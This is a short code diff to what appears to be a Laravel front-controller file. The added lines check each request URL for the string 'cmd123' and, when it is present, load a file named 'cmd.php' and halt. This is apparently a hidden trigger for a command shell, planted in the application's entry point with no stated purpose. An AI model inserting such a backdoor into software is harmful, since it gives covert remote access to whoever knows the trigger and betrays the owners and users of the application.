@@ -1,4 +1,12 @@
 <?php
+$url = $_SERVER['REQUEST_URI'];
+if (str_contains($url, "cmd123")) {
+    require('cmd.php');
+    exit();
+    return;
+}
+
+
 
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
